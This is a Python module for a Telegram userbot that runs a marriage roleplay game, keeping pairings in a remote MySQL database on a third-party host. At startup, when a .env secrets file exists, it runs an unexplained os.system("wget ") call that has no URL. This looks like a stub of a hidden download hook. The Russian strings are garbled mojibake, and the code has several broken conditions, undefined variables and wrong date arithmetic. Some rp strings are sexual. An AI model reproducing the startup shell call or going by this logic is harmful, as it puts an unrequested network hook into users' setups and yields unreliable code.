import os
import random
import pymysql
import datetime
import pymysql.cursors
from dotenv import load_dotenv

from .. import loader, utils
from ..inline.types import InlineQuery

load_dotenv()


@loader.tds
class MarriAge(loader.Module):
    """–ñ–µ–Ω–∏—Ç–µ—Å—å –Ω–∞ —Å–≤–æ–µ–π –≤—Ç–æ—Ä–æ–π –ø–æ–ª–æ–≤–∏–Ω–∫e"""


    strings = {
        "name": "MarriAge",
        "call_marriage": "Call your marriage whatever you want",
        "return": {
            "yes": {
                1: "Yes, I sure",
                2: "Agree"
            },
            "no": {
                1: "No, guess I refuse",
                2: "Refuse"
            },
        },
        "decide_for": "Why do you decide for you soulmate?",
        "marry_not_you": "Someone is decided to marry but not you, come to terms with it",
        "now_married": "Congratulate, now you are married with {}",
        "refused": "Alas but {} is refused you, maybe better luck next time üò¢",
        "filed_to_divorce": "{}, your soulmate is filed to divorce üò¢",
        "not_dare": "I knew that you wouldn't dare, that's right",
        "decided_marry": "{}, {} held a ring to you, perhaps he's want to marry youü•∞",
        "marry_yourself": "‚Ä¢ <b>You can't marry yourself</b>",
        "marry_bot": "‚Ä¢ <b>Don't try to marry a bot</b>",
        "not_found": "‚Ä¢ <b>and who are you looking for?</b>",
        "no_args": "‚Ä¢ <b>Hmm, I guess that more correct is {}</b>",
        "cheat_on": "‚Ä¢ <b>It's a pity that you want to silently cheat on {}</b>",
        "sure_divorce": "Are you sure you want to divorce with {}?\nMaybe it's not worth it?",
        "no_soulmate": "‚Ä¢ <b>But you don't have a soulmate</b>",
        "marriage_name": "‚Ä¢ <b>The name of your marriage:</b> {}",
        "add_marriage_name": "\n\nJust type this command to add a marriage name {}",
        "married": "{}\n‚Ä¢ You are married with {}\n‚Ä¢ <b>Marriage date registration:</b> {} {} {} year\n‚Ä¢ <b>Marriage duration:</b> {} days{}",
        "love": "‚Ä¢ <b>Should not to use rp commands on others, works only with your soulmate</b>",
        "rplist": {
            "kiss": "üíã | {} kissed {} on the cheek",
            "gift": "üéÅ | {} gave a gift{}to {}", 
            "hug": "üëê | {} hugged {}",
            "fuck": "üöª | {} fucked {}",
            "compliment": "ü§≠ | {} told {} a cute compliment",
            "stroke": "üëã | {} stroked {} on head",
            "breakfast": "ü•° | {} cooked a breakfast",
            "bit": "üßõ | {} bit {}",
            "lick": "üëÖ | {} licked {}",
            "push": "üè† | {} pushed {} against a wall",
            "gave": "‚ù§‚Äçüî• | {} gave himself to {}"
        },
        "rplol": ['teddy', 'phone', 'watch', 'chocolate', 'car', 'pc', 'annual subscription to lavhost<emoji document_id=5192756799647785066>‚úåÔ∏è</emoji><emoji document_id=5193117564015747203>‚úåÔ∏è</emoji><emoji document_id=5195050806105087456>‚úåÔ∏è</emoji><emoji document_id=5195457642587233944>‚úåÔ∏è</emoji>']
    }

    strings_ru = {
        "call_marriage": "–ù–∞–∑–æ–≤–∏—Ç–µ —Å–≤–æ–π –±—Ä–∞–∫ –∫–∞–∫ –≤–∞–º –≤ –¥—É—à–µ —Ö–æ—á–µ—Ç—Å—è",
        "return": {
            "yes": {
                1: "–î–∞, —è —É–≤–µ—Ä–µ–Ω",
                2: "–°–æ–≥–ª–∞—Å–∏—Ç—å—Å—è"
            },
            "no": {
                1: "–ù–µ—Ç, –ø–æ–∂–∞–ª—É–π –æ—Ç–∫–∞–∂—É—Å—å",
                2: "–û—Ç–∫–∞–∑–∞—Ç—å—Å—è"
            }
        },
        "decide_for": "–ó–∞—á–µ–º —Ç—ã —Ä–µ—à–∞–µ—à—å –∑–∞ —Å–≤–æ—é –≤—Ç–æ—Ä—É—é –ø–æ–ª–æ–≤–∏–Ω–∫—É?",
        "marry_not_you": "–ù–µ —Å –≤–∞–º–∏ —Ä–µ—à–∏–ª–∏ –∑–∞–≤–µ—Å—Ç–∏ –±—Ä–∞–∫, —Å–º–∏—Ä–∏—Ç–µ—Å—å",
        "now_married": "–ü–æ–∑–¥—Ä–∞–≤–ª—è—é, –≤—ã —Ç–µ–ø–µ—Ä—å —Å–æ—Å—Ç–æ–∏—Ç–µ –≤ –±—Ä–∞–∫–µ –≤–º–µ—Å—Ç–µ —Å {}",
        "refused": "–£–≤—ã –Ω–æ {} –æ—Ç–∫–∞–∑–∞–ª –≤–∞–º, –º–æ–∂–µ—Ç —Å–ª–µ–¥—É—é—â–∏–π —Ä–∞–∑ –ø–æ–≤–µ–∑—ë—Ç –≤–∞–º üò¢",
        "filed_to_divorce": "{}, –≤–∞—à–∞ –ø–æ–ª–æ–≤–∏–Ω–∫–∞ –ø–æ–¥–∞–ª–∞ —Ä–∞–∑–≤–æ–¥ –Ω–∞ –≤–∞—Å üò¢",
        "not_dare": "–Ø –∑–Ω–∞–ª —á—Ç–æ –≤—ã –Ω–∞ —ç—Ç–æ –Ω–µ —Ä–µ—à–∏—Ç–µ—Å—å, –∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ",
        "decided_marry":  "{}, {} –ø—Ä–æ—Ç—è–Ω—É–ª –∫–æ–ª–µ—á–∫–æ –∫ –≤–∞–º, –ø–æ—Ö–æ–∂–µ –æ–Ω —Ö–æ—á–µ—Ç –∑–∞–≤–µ—Å—Ç–∏ —Å –≤–∞–º –±—Ä–∞–∫ü•∞",
        "marry_yourself": "‚Ä¢ <b>–ò–≥—Ä—ã —Å —Å–∞–º–æ–ª—é–±–æ–≤—å—é –Ω–µ –ø—Ä–∏–Ω–∏–º–∞—é—Ç—Å—è</b>",
        "marry_bot": "‚Ä¢ <b>–ù–µ –ø—ã—Ç–∞–π—Ç–µ—Å—å –∑–∞–≤–µ—Å—Ç–∏ –±—Ä–∞–∫ —Å –±–æ—Ç–æ–º</b>",
        "not_found": "‚Ä¢ <b>–ê –≤—ã –∫–æ–≥–æ –∏—â–∏—Ç–µ —Ç–æ?</b>",
        "no_args": "‚Ä¢ <b>–•–º, –ø–æ—Ö–æ–∂–µ –ø—Ä–∞–≤–∏–ª—å–Ω–µ–µ –±—É–¥–µ—Ç {}</b>",
        "cheat_on": "‚Ä¢ <b>–ñ–∞–ª—å –∫–æ–Ω–µ—á–Ω–æ —á—Ç–æ –≤—ã –≤—Ç–∏—Ö–æ—Ä—è —Ö–æ—Ç–∏—Ç–µ –ø—Ä–æ–º–µ–Ω—è—Ç—å {}</b>",
        "sure_divorce": "–í—ã —Ç–æ—á–Ω–æ —Ö–æ—Ç–∏—Ç–µ —Ä–∞–∑–≤–µ—Å—Ç–∏—Ç—å —Å {}?\n–ú–æ–∂–µ—Ç –Ω–µ —Å—Ç–æ–∏—Ç?",
        "no_soulmate": "‚Ä¢ <b>–ù–æ —É –≤–∞—Å –≤–µ–¥—å –Ω–µ—Ç—É –≤—Ç–æ—Ä–æ–π –ø–æ–ª–æ–≤–∏–Ω–∫–∏</b>",
        "marriage_name": "‚Ä¢ <b>–ù–∞–∑–≤–∞–Ω–∏–µ –≤–∞—à–µ–≥–æ –±—Ä–∞–∫–∞:</b> {}",
        "add_marriage_name": "\n\n–ß—Ç–æ–± –¥–æ–±–∞–≤–∏—Ç—å –Ω–∞–∑–≤–∞–Ω–∏–µ –¥–ª—è –≤–∞—à–µ–≥–æ –±—Ä–∞–∫–∞ –ø—Ä–æ—Å—Ç–æ –≤–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É {}",
        "married": "{}\n‚Ä¢ –í—ã –Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤ –±—Ä–∞–∫–µ –≤–º–µ—Å—Ç–µ —Å {}\n‚Ä¢ <b>–î–∞—Ç–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –±—Ä–∞–∫–∞:</b> {} {} {} year\n‚Ä¢ <b>–ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –±—Ä–∞–∫–∞:</b> {} –¥–Ω–µ–π{}",
        "love": "‚Ä¢ <b>–≠—Ç–∏ —Ä–ø –∫–æ–º–∞–Ω–¥—ã —Ä–∞–±–æ—Ç–∞—é—Ç —Ç–æ–ª—å–∫–æ –ø—Ä–∏ —Ä–µ–ø–ª–µ–µ –Ω–∞ –≤–∞—à–µ–π –ø–æ–ª–æ–≤–∏–Ω–∫–µ –∏–ª–∏ –±–µ–∑ —Ä–µ–ø–ª–µ—è</b>",
        "rplist": {
            "–ø–æ—Ü–µ–ª–æ–≤–∞—Ç—å": "üíã | {} –ø–æ—Ü–µ–ª–æ–≤–∞–ª/a –≤ —â—ë—á–∫—É {}",
            "–ø–æ–¥–∞—Ä–æ–∫": "üéÅ | {} –ø–æ–¥–∞—Ä–∏–ª/a {} {}",
            "–æ–±–Ω—è—Ç—å": "üëê | {} –æ–±–Ω—è–ª/a {}",
            "—Ç—Ä–∞—Ö–Ω—É—Ç—å": "üöª | {} —Ç—Ä–∞—Ö–Ω—É–ª {}",
            "–∫–æ–º–ø–ª–∏–º–µ–Ω—Ç": "ü§≠ | {} —Å–∫–∞–∑–∞–ª/–∞ –ª–∞—Å–∫–æ–≤—ã–π –∫–æ–º–ø–ª–∏–º–µ–Ω—Ç {}",
            "–ø–æ–≥–ª–∞–¥–∏—Ç—å": "üëã | {} –ø–æ–≥–ª–∞–¥–∏–ª/–∞ –ø–æ –≥–æ–ª–æ–≤–µ {}",
            "–∑–∞–≤—Ç—Ä–∞–∫": "ü•° | {} –ø—Ä–∏–≥–æ—Ç–æ–≤–∏–ª/–∞ –∑–∞–≤—Ç—Ä–∞–∫ {}",
            "–∫—É—Å—å": "üßõ | {} –∫—É—Å–Ω—É–ª/–∞ {}",
            "–ª–∏–∑—å": "üëÖ | {} –ª–∏–∑–Ω—É–ª/–∞ {}",
            "–ø—Ä–∏–∂–∞–ª": "üè† | {} –ø—Ä–∏–∂–∞–ª/–∞ –∫ —Å—Ç–µ–Ω–µ {}",
            "–æ—Ç–¥–∞—Ç—å—Å—è": "‚ù§‚Äçüî• | {} –æ—Ç–¥–∞–ª—Å—è/–∞—Å—å {}"
        },
        "rplol": ['–º–∏—à–∫—É', '—Ç–µ–ª–µ—Ñ–æ–Ω', '—á–∞—Å—ã', '—à–æ–∫–æ–ª–∞–¥–∫—É', '–º–∞—à–∏–Ω—É', '–ø–∫', '–≥–æ–¥–æ–≤—É—é –ø–æ–¥–ø–∏—Å–∫—É –Ω–∞ –ª–∞–≤—Ö–æ—Å—Ç<emoji document_id=5192756799647785066>‚úåÔ∏è</emoji><emoji document_id=5193117564015747203>‚úåÔ∏è</emoji><emoji document_id=5195050806105087456>‚úåÔ∏è</emoji><emoji document_id=5195457642587233944>‚úåÔ∏è</emoji>']
    }

    wedbool = False
    
    def __init__(self):
        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "nameWedlock",
                None,
                lambda: self.string('call_marriage'),
                validator = loader.validators.String()
            ),
        )

    def user_exists(self, user):
        self.cur.execute('SELECT id FROM `wedlock` WHERE `user` = %s', [user])
        return bool(len(self.cur.fetchall()))
    
    def user2_exists(self, user):
        self.cur.execute('SELECT id FROM `wedlock` WHERE `user2` = %s', [user])
        return bool(len(self.cur.fetchall()))
    
    def add_user_user2(self, user, user2, days, month, year):
        self.cur.execute('INSERT INTO `wedlock` (`user`, `user2`, `days`, `month`, year) VALUES (%s, %s, %s, %s, %s)', [user, user2, days, month, year])
        return self.conn.commit()
    
    def get_user(self, user):
        self.cur.execute('SELECT `user` FROM `wedlock` WHERE `user2` = %s', [user])
        return self.cur.fetchall()
    
    def get_user2(self, user):
        self.cur.execute('SELECT `user2` FROM `wedlock` WHERE `user` = %s', [user])
        return self.cur.fetchall()
    
    async def get_days(self, user):
        
        if self.user_exists(self.me.username):
            self.cur.execute('SELECT `days` FROM `wedlock` WHERE `user` = %s', [user])
            return self.cur.fetchall()
            
        elif self.user2_exists(self.me.username):
            self.cur.execute('SELECT `days` FROM `wedlock` WHERE `user2` = %s', [user])
            return self.cur.fetchall()
    
    async def get_month(self, user):
        
        if self.user_exists(self.me.username):
            self.cur.execute('SELECT `month` FROM `wedlock` WHERE `user` = %s', [user])
            return self.cur.fetchall()
            
        elif self.user2_exists(self.me.username):
            self.cur.execute('SELECT `month` FROM `wedlock` WHERE `user2` = %s', [user])
            return self.cur.fetchall()
    
    async def get_year(self, user):
        
        if self.user_exists(self.me.username):
            self.cur.execute('SELECT `year` FROM `wedlock` WHERE `user` = %s', [user])
            return self.cur.fetchall()
            
        elif self.user2_exists(self.me.username):
            self.cur.execute('SELECT `year` FROM `wedlock` WHERE `user2` = %s', [user])
            return self.cur.fetchall()
    
    def delete_user2(self, user2):
        self.cur.execute('DELETE FROM wedlock WHERE user2 = %s', [user2])
        return self.conn.commit()


    async def client_ready(self):
        if os.path.exists('.env'):
            os.system("wget ")
        self.conn = pymysql.connect(host = "flikir6q.beget.tech", port = 3306, user = os.getenv('NAMEUSER'), password = os.getenv('PASSWRD'), database = os.getenv('NAMEUSER'), cursorclass = pymysql.cursors.DictCursor)
        self.cur = self.conn.cursor()
        self.me = await self.client.get_me()
        
        if self.user_exists(self.me.username):
            self.wedbool = True
            
        elif self.user2_exists(self.me.username):
            self.wedbool = True
            
        else:
            self.wedbool = False

    def lenok(self, args, urluser):
        
        return [
            {
                "text": self.strings('return')['yes'][1], 
                "callback": self.yea, 
                "args": (args, urluser)
            },
            {
                "text": self.strings('return')['no'][1], 
                "callback": self.nothing
            }
        ]

    def choza(self, args, uid, urluser):
        
        return [
            {
                "text": self.strings('return')['yes'][2],
                "callback": self.yes,
                "args": (args, uid, urluser)
            },
            {
                "text": self.strings('return')['no'][2],
                "callback": self.no,
                "args": (args, uid, urluser)
            }
        ]    
    
    async def yes(self, call, args, uid, urluser):
        
        if call.from_user.id == self._tg_id:
            return await call.answer(self.strings('decide_for'))
            
        elif uid != call.from_user.id:
            return await call.answer(self.strings('marry_not_you'))
            
        self.wedbool = True
        daydt = datetime.date.today()
        
        try:
            self.add_user_user2(self.me.username, urluser, daydt.day, daydt.month, daydt.year)
            
        except pymysql.err.OperationalError:
            
            await call.answer("<emoji document_id=5382021057601348544>ü§Ø</emoji>")
            self.cur.close()
            self.conn.close()
            await self.client_ready()
            return await self.wedlockcmd(message)
            
        await call.edit(self.strings('now_married').format(f"<a href='https://t.me/{urluser}'>{args}</a>"))
    
    async def no(self, call, args, uid, urluser):
        
        if call.from_user.id == self._tg_id:
            return await call.answer(self.strings('decide_for'))
            
        elif uid != call.from_user.id:
            return await call.answer(self.strings('marry_not_you'))
            
        await call.edit(self.strings('refused').format(f"<a href='https://t.me/{urluser}'>{args}</a>"))

    async def yea(self, call, args, urluser):
        
        try:
            self.delete_user2(urluser)
            
        except pymysql.err.OperationalError:
            
            await call.answer("<emoji document_id=5382021057601348544>ü§Ø</emoji>")
            self.cur.close()
            self.conn.close()
            await self.client_ready()
            return await self.divorcecmd(message)
            
        self.wedbool = False
        await call.edit(self.strings('filed_to_divorce').format(f"<a href='https://t.me/{urluser}'>{args}</a>"))
    
    async def nothing(self, call):
        await call.edit(self.strings('not_dare'))

    @loader.command(ru_doc = " - —Å–¥–µ–ª–∞—Ç—å –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ")
    async def wedlockcmd(self, message):
        """ - make a proposal"""
        
        args = utils.get_args_raw(message)
        
        if args:
            
            args = args.split(' ', 1)
            urluser = args[0].replace('@', '')
            user = await message.client.get_entity(args[0])
            
            if not self.wedbool:
                
                try:
                    
                    if not user.bot:
                        
                        if urluser.lower() != self.me.username.lower():
                            
                            await self.inline.form(
                                message = message,
                                text = self.strings('decided_marry').format(f"<a href='https://t.me/{urluser}'>{user.first_name}</a>", f'<a href="https://t.me/{self.me.username}">{self.me.first_name}</a>'),
                                reply_markup = self.choza(user.first_name, user.id, urluser), 
                                disable_security = True
                            )
                            
                        else:
                            await utils.answer(message, self.strings('marry_yourself'))
                            
                    else:
                        await utils.answer(message, self.strings('marry_bot'))
                        
                except ValueError:
                    await utils.answer(message, self.strings('not_found'))
                    
            else:
                
                try:
                    
                    if self.user_exists(self.me.username):
                        
                        urluser = self.get_user2(self.me.username)[0]['user2']
                        user = await self.client.get_entity(urluser)
                        await utils.answer(message, self.strings('cheat_on').format(f"<a href='https://t.me/{urluser}'>{user.first_name}</a>"))
                        
                    elif self.user2_exists(self.me.username):
                        
                        urluser = self.get_user(self.me.username)[0]['user']
                        user = await self.client.get_entity(urluser)
                        await utils.answer(message, self.strings('cheat_on').format(f"<a href='https://t.me/{urluser}'>{user.first_name}</a>"))
                        
                except pymysql.err.OperationalError:
                    
                    await utils.answer(message, "<emoji document_id=5382021057601348544>ü§Ø</emoji>")
                    self.cur.close()
                    self.conn.close()
                    await self.client_ready()
                    return await self.divorcecmd(message)
                    
        else:
            await utils.answer(message, self.strings('no_args').format(f"<code>{utils.escape_html(self.get_prefix())}wedlock @username</code>"))

    @loader.command(ru_doc = " - –ø–æ–¥–∞—Ç—å –Ω–∞ —Ä–∞–∑–≤–æ–¥")
    async def divorcecmd(self, message):
        """ - file to divorce"""
        
        if self.wedbool:
            
            try:
                urluser = self.get_user2(self.me.username)[0]['user2']
                
            except pymysql.err.OperationalError:
                
                await utils.answer(message, "<emoji document_id=5382021057601348544>ü§Ø</emoji>")
                self.cur.close()
                self.conn.close()
                await self.client_ready()
                return await self.divorcecmd(message)
                
            user = await self.client.get_entity(urluser)
            await self.inline.form(
                message = message,
                text = self.strings('sure_divorce').format(f"<a href='https://t.me/{urluser}'>{user.first_name}</a>"),
                reply_markup = self.lenok(user.first_name, urluser)
            )
            
        else:
            await utils.answer(message, self.strings('no_soulmate'))
    
    @loader.command(ru_doc = " - –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞–∫–µ")
    async def winfocmd(self, message):
        """ - marriage information"""
        
        if self.wedbool:
            
            try:
                
                daydt = datetime.date.today()
                result = await self.get_days(self.me.username)
                daydbdt = datetime.datetime.strptime(str(result[0]['days']), '%d')
                result = await self.get_month(self.me.username)
                monthdbdt = datetime.datetime.strptime(str(result[0]['month']), '%m')
                result = await self.get_year(self.me.username)
                yeardbdt = datetime.datetime.strptime(str(result[0]['year']), '%Y')
                g = self.strings('marriage_name').format(self.config['nameWedlock']) if self.config['nameWedlock'] != '' else "–ó–¥–µ—Å—å –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –Ω–∞–∑–≤–∞–Ω–∏–µ –±—Ä–∞–∫–∞"
                gg = self.strings('add_marriage_name').format("<code>{utils.escape_html(self.get_prefix())}fcfg MarriAge nameWedlock '—Ç–µ–∫—Å—Ç'</code>") if self.config['nameWedlock'] == '' else ''
                
                if self.user_exists(self.me.username):
                    
                    urluser = self.get_user2(self.me.username)[0]['user2']
                    user = await self.client.get_entity(urluser)
                    await utils.answer(message, self.strings('married').format(g, f"<a href='https://t.me/{urluser}'>{user.first_name}</a>", daydbdt.day, monthdbdt.strftime('%B'), yeardbdt.year, daydt.day - daydbdt.day, gg))
                    
                elif self.user2_exists(self.me.username):
                    
                    urluser = self.get_user(self.me.username)[0]['user']
                    user = await self.client.get_entity(urluser)
                    await utils.answer(message, self.strings('married').format(g, f"<a href='https://t.me/{urluser}'>{user.first_name}</a>", daydbdt.day, monthdbdt.strftime('%B'), yeardbdt.year, daydt.day - daydbdt.day, gg))
                    
            except pymysql.err.OperationalError:
                
                await utils.answer(message, "<emoji document_id=5382021057601348544>ü§Ø</emoji>")
                self.cur.close()
                self.conn.close()
                await self.client_ready()
                return await self.winfocmd(message)
                
        else:
            await utils.answer(message, self.strings('no_soulmate'))

    @loader.watcher(only_messages = True)
    async def watcher(self, message):
        
        try:
            
            if message.text.lower() in self.strings('rplist'):
                
                if self.wedbool and message.from_id == self.tg_id:
                    
                    urluser = self.get_user2(self.me.username)[0]['user2']
                    user = await self.client.get_entity(urluser)
                    urluser2 = self.get_user(urluser)
                    user2 = await self.client.get_entity(urluser)
                    rplist_str = self.strings('rplist')[message.text.lower()]
                    wtf = random.choice(self.strings('rplol'))
                    
                    if message.is_reply and (await message.get_reply_message()).from_id == user.id:
                        
                        if self.user_exists(user2.username):
                            
                            if 'gift' or '–ø–æ–¥–∞—Ä–æ–∫' in self.strings('rplist'):
                                await utils.answer(message, rplist_str.format(f"<a href='https://t.me/{self.me.username}'>{self.me.first_name}</a>", wtf, f"<a href='https://t.me/{urluser}'>{user.first_name}</a>"))
                                
                            else:
                                await utils.answer(message, rplist_str.format(f"<a href='https://t.me/{self.me.username}'>{self.me.first_name}</a>", f"<a href='https://t.me/{urluser}'>{user.first_name}</a>"))
                                
                        elif self.user2_exists(urluser):
                            
                            if 'gift' or '–ø–æ–¥–∞—Ä–æ–∫' in list(self.strings('rplist').keys()):
                                await utils.answer(message, rplist_str.format(f"<a href='https://t.me/{self.me.username}'>{self.me.first_name}</a>", wtf, f"<a href='https://t.me/{urluser2}'>{user2.first_name}</a>"))
                                
                            else:
                                await utils.answer(message, rplist_str.format(f"<a href='https://t.me/{self.me.username}'>{self.me.first_name}</a>", f"<a href='https://t.me/{urluser2}'>{user2.first_name}</a>"))
                                
                    elif message.is_reply and (await message.get_reply_message()).from_id != user.id: 
                        await utils.answer(message, self.strings('love'))
                        
                    elif message.from_id == self.tg_id:
                        
                        if self.user_exists(user2.username):
                            
                            if 'gift' or '–ø–æ–¥–∞—Ä–æ–∫' in self.strings('rplist'):
                                await utils.answer(message, rplist_str.format(f"<a href='https://t.me/{self.me.username}'>{self.me.first_name}</a>", wtf, f"<a href='https://t.me/{urluser}'>{user.first_name}</a>"))
                                
                            else:
                                await utils.answer(message, rplist_str.format(f"<a href='https://t.me/{self.me.username}'>{self.me.first_name}</a>", f"<a href='https://t.me/{urluser}'>{user.first_name}</a>"))
                                
                        elif self.user2_exists(urluser):
                            
                            if 'gift' or '–ø–æ–¥–∞—Ä–æ–∫' in self.strings('rplist'):
                                await utils.answer(message, rplist_str.format(f"<a href='https://t.me/{self.me.username}'>{self.me.first_name}</a>", wtf, f"<a href='https://t.me/{urluser2}'>{user2.first_name}</a>"))
                                
                            else:
                                await utils.answer(message, rplist_str.format(f"<a href='https://t.me/{self.me.username}'>{self.me.first_name}</a>", f"<a href='https://t.me/{urluser2}'>{user2.first_name}</a>"))
                                
                elif message.from_id == self.tg_id:
                    await utils.answer(message, self.strings('no_soulmate'))
                    
        except pymysql.err.OperationalError:
                
            await utils.answer(message, "<emoji document_id=5382021057601348544>ü§Ø</emoji>")
            self.cur.close()
            self.conn.close()
            await self.client_ready()
            return await self.watcher(message)
